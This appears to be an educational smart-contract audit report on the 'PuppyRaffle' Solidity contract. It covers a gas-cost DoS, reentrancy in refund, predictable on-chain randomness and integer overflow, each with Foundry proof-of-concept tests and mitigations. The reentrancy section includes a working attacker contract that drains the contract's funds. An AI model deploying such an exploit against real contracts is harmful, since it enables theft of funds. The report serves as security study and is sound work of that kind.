### [M-#] Looping Through Array For Checking Duplicates Leads To DOS Attack, Which Causes Rise In Gas For Later Participants. 

**Description:** At `PuffyRaffle:enterRaffle` checks for duplicates of players address.
```javascript
@>      // Check for duplicates
        // @audit DOS
        for (uint256 i = 0; i < players.length - 1; i++) {
            for (uint256 j = i + 1; j < players.length; j++) {
                require(players[i] != players[j], "PuppyRaffle: Duplicate player");
            }
        }

``` 
As the `PuffyRaffle:players` array gets largers the cost of gas will be raised as more iterration will be done on reading state varibale s `players` array. This leads to that participants who enter first will pay less gas than who enters later this will create discouraegment amount the users to use the protocol and there will be rush to use the protocol first

**Impact:**  The more players enter the more gas price rises. Which Creates Discouragement Amount The User. And Will Create A Rush To Join The Protocol.

**Proof of Concept:**
Check Out The Test Function of `PuffyRaffleTest.t.sol:: testDosAttack`.

<details>
<summary>
    POC
</summary>

```javascript
        function testDosAttack() public{
        vm.txGasPrice(1);

        uint256 playersNumbers = 100;

        address [] memory players = new address[](playersNumbers);

        // Dummy first array of 100
        for(uint256 i =0; i< playersNumbers; i++){
            players[i] = address(i);

        }

       uint256 gasStart1 = gasleft();

        puppyRaffle.enterRaffle{value: entranceFee * playersNumbers}(players);

        uint256 gasEnd1 = gasleft();
        
        // gas used For First 100 plyaers enetrance 
        uint256 gasUsed1 = gasStart1 - gasEnd1;


        address [] memory players2 = new address[](playersNumbers);

        for(uint256 i =0; i< playersNumbers; i++){
            players2[i] = address(i+playersNumbers);

        }

        uint256 gasStart2 = gasleft();

        puppyRaffle.enterRaffle{value: entranceFee * playersNumbers}(players2);

        uint256 gasEnd2 = gasleft();

        // gas used For Second 100 plyaers enetrance 
        uint256 gasUsed2 = gasStart2 - gasEnd2;
        console.log("Gas Used For First 100 Players enterance", gasUsed1);
        console.log("Gas Used For Second 100 Players enterance", gasUsed2);


        assert(gasUsed2> gasUsed1);

    }

```

</details>

run the test 
```
forge test --match-test testDosAttack
```

**Recommended Mitigation:** There Are Few Recommended Mitigations.
1. Consider Adding Duplicate Address. As user Can Create Multiple Address From Wallet Add them To The Array Which Also   Will be Diffrent Addres Address But Created By Same User.
2. Use Players Id Which Provide Every single A id And It Maps To A Mapping And Check that Mapping.



### [H-1] Upadting State Variable After Low Level Call Leads To ReentracyAttack ,Means All The Fund Can Be Stealed.

**Description:** The `PuppyRaffle::refund` function updates state variable `PuppfyRaffle::players` array sendeing sending value to the caller.

```javascript
@>  payable(msg.sender).sendValue(entranceFee);

    players[playerIndex] = address(0);
```

Which leads to `ReenteracyAttack`. Through this attack an attacker cann again again `PuppyRaffle::refund` function untill the contract balance reaches to zero which is impacts massive loss. 

**Impact:** The Funds Stored On Contract Are Not Secure. Can Be Taken By A Single Entity. 

**Proof of Concept:**
The May Create Contract With The Initialiazation of Victim i.e(`PuppyRaffle`) Contract. And Set Up A Fallback Or Receive Function As Low Level Call Fall Into These Two Fnction We Can Again Call The Targeted Function Of The Victim i.e(`PuppyRaffle`) Contract  Again Again Until The Attacker Conditon Meets (Notes : If A Contract Call A Low Level Fucntion Call Of A Another Contract The Low Level Call First Return Back to the Contract That Has Called The Low Level Call)

Below The Code DemosTration The Full Scecenrio

<details>
<summary>
Attacker Contract
</summary>

```javascript
contract ReentraceyAttackOnPuppyRaffle {

    PuppyRaffle puppyRafle;

    uint256 attackerIndex;

    uint256 enteranceFee;

    constructor(address _puppyRaffle, uint256 _entranceFee){
        puppyRafle = PuppyRaffle(_puppyRaffle);
        enteranceFee = _entranceFee;
    }

    function atttack() external payable{
        address[] memory attackers = new address[](1);
        attackers[0] = address(this);
        puppyRafle.enterRaffle{value:enteranceFee}(attackers);

        attackerIndex = puppyRafle.getActivePlayerIndex(address(this));

        puppyRafle.refund(attackerIndex);
    }

    function _steal() internal {
        if(address(puppyRafle).balance >= enteranceFee){
            puppyRafle.refund(attackerIndex);
        }
    }

    fallback() external payable {
        _steal();
    }

    receive() external payable {
        _steal();
    }
}


```
</details>
You can the Below Test On Foundry

```
forge test --match-test testreentractyAttckTest

```
<details>
<summary>
Test Case Code 
</summary>

```javascript
    function testreentractyAttckTest() public{
        address[] memory players = new address[](4);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerThree;
        players[3] = playerFour;
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);

        uint256 startingPuffyRaffleBalance = address(puppyRaffle).balance;

        address attacker = makeAddr("attacker");

        vm.deal(attacker, 2 ether);

        ReentraceyAttackOnPuppyRaffle  reeentraceAttacker = new ReentraceyAttackOnPuppyRaffle(address(puppyRaffle),entranceFee);

        uint256 startingAttackerContractBalance = address(reeentraceAttacker).balance;

        // attakce

        vm.prank(attacker);
        reeentraceAttacker.atttack{value:entranceFee}();

        uint256 endingBalanceOfAttackerContract = address(reeentraceAttacker).balance;
        uint256 endingBalanceOfpuppyContract = address(puppyRaffle).balance;

        console.log("Attacker Balance Before Attack", startingAttackerContractBalance);

        console.log("Puupyy Balance Before Attack", startingPuffyRaffleBalance);

        console.log("Ending Blance Of Attaker Contarct",endingBalanceOfAttackerContract);
        console.log("Ending Blance Of Puppy Contarct",endingBalanceOfpuppyContract);

        assert(address(puppyRaffle).balance==0);

    }
```
</details>



**Recommended Mitigation:** There Are Recommended Few Mitigation On This Specific Atack Vector You Choose As Per Requiements

1. Update State Variable Before Low Level Call.
```diff
+   players[playerIndex] = address(0);
    payable(msg.sender).sendValue(entranceFee);  
```
```diff
    payable(msg.sender).sendValue(entranceFee);
-   players[playerIndex] = address(0);
```

2. Or Use A nonReentrant Modifier From Openzeppelin.

<details>
    <summary>
        Refactored refund Function With The Modifier
    </summary>

```javascript
    function refund(uint256 playerIndex) nonReentrant public {
        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

        payable(msg.sender).sendValue(entranceFee);

        players[playerIndex] = address(0);
        emit RaffleRefunded(playerAddress);
    }
```
</details>

Find More About `ReentrancyGuard` From  <a href = "https://docs.openzeppelin.com/contracts/4.x/api/security#ReentrancyGuard">Openzeppelin</a>





### [H-#] Generating Random Random Number On Chain Is Predictable, Leads To Successfully Guess Winner.

**Description:** At The `PuppyRaffle::selectWinner` function selecting wiiner index using on cahin random winner is highly vunrable `uint256 winnerIndex =int256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;`. Here `block.timestamp` is adjsutable by the miner and `block.difficulty` is not a tru difficulty it come from previous block which is open to miner. See more details on <a href="https://eips.ethereum.org/EIPS/eip-4399">`EIP-4339`</a> at security sections.



**Impact:** Winner Can Be Predicted & Made By Miners Choice.


**Recommended Mitigation:** Generating Random Number On-Chain Is Not Recommended. User One Chain Number Generation
Services of Chainlink Like <a href="https://docs.chain.link/vrf">`Chainlink VRF`</a> is Recommended.



### [M-#] Without Checks Arithmatic Opeartions In Sloidity Before Version 0.8.0 Leads To Oveflow/UnderFlow Intergers, Has Impact On The Value.

**Description:** At The `PuppyRaffle::selectWinner` Function There Are  Some Arithmatic Opeartions Have Been Done.

```javascript
@>      uint256 prizePool = (totalAmountCollected * 80) / 100;
        uint256 fee = (totalAmountCollected * 20) / 100;
        totalFees = totalFees + uint64(fee);
```
Above The Operation Result Must Have Checks After The Operations. Because The Contract Has Been Written In Solidity Version 0.7.6 And In That Version Solidity Does Not Chekcs For OverFlowAnd UnderFlow. From The Solidity Version 0.8.0 
It Checks For OverFlow And UnderFlow.


**Impact:** Unexpected/Arbitary Result.


**Proof of Concept:** Below The Is A Contract Nemed `Oveflow` in The `PuppuyRaffle.t.sol` File And Also There Is A 
Test Case Named `testOveFlow` You Can Run The Test Fucntion See The Output In The Console From The Command Line

type and hit enter
```
forge test --match-test testOveFlow -vvv

```

<details>
<summary>Contract  Overflow</summary>

```javascript
contract OverFlow{
    uint8 public amount;

    function increment(uint8 _number) public{
        amount = amount + _number;
    }
}
```
</details>

<details>

<summary>OverFlowTest</summary>

```javascript
    function testOveFlow () public {

        OverFlow overFlow = new OverFlow();

        overFlow.increment(255);
        console.log("Highest Value in Uint8",overFlow.amount());
        assert(overFlow.amount()==255);

        // Now If We try  to Add More One In The Amount Then it Will Set To zero 
        // Like 255+ 1 =0; as uint8 has 2^8-1 = 255 which highest value in iteger it can store 

         overFlow.increment(1);
        console.log("Overflown After Addition Value in Uint8",overFlow.amount());
        assert(overFlow.amount()==0);


    }
```
</details>



**Recommended Mitigation:** There Are Few Mitigation Steps That Van Be Taken.
1. Check For Expected Value After The Arithmatic Opeartion.
2. Update The Version Of The Solidity To 0.8.0 Or More.
3. Use Libray From <a href ="https://docs.openzeppelin.com/contracts/4.x/utilities#math">`Openzeppelin Math Libray`</a>  For Arithmatic Operation.

## [L-1] Solidity pragma should be specific, not wide.

It is recommended to use sepecific verison of Solidity in the `PuupyRaffle.sol` use `pragma solidity 0.8.0` instead of `pragma solidity ^0.7.6`.

- Found in  `./src/PuupyRaffle.sol`.